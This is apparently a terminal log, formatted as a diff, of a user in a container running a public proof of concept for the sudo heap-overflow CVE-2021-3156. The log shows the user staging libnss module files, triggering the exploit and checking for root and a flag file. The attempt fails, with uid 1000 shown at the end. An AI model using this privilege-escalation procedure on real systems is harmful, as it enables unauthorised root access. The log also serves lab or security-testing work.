@@ -1,0 +1,22 @@
+### ensure module name variants exist
+cd /run/lock/samedit2/out && cp -n 'libnss_X/P0P_SH3LLZZ_ .so.2' 'libnss_X/P0P_SH3LLZ_.so.2' 2>/dev/null; ls -b libnss_X
+[0m[01;32mP0P_SH3LLZ_\ .so.2[0m  [01;32mP0P_SH3LLZ_.so.2[0m
+maya.chen@c389ff99c726:/run/lock/samedit2/out$ 
+### trigger
+./hax_static 1
+
+** CVE-2021-3156 PoC by blasty <peter@haxx.in>
+
+using target: Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
+** pray for your rootshell.. **
+[sudo] password for maya.chen: 
+### feeding password
+
+maya.chen is not in the sudoers file.  This incident will be reported.
+maya.chen@c389ff99c726:/run/lock/samedit2/out$ 
+### post
+id; echo ---; cat /tmp/flag_out 2>>/dev/null; echo ---; ls -l /tmp/.r00t 2>/dev/null
+uid=1000(maya.chen) gid=1000(maya.chen) groups=1000(maya.chen)
+---
+---
+maya.chen@c389ff99c726:/run/lock/samedit2/out$ 
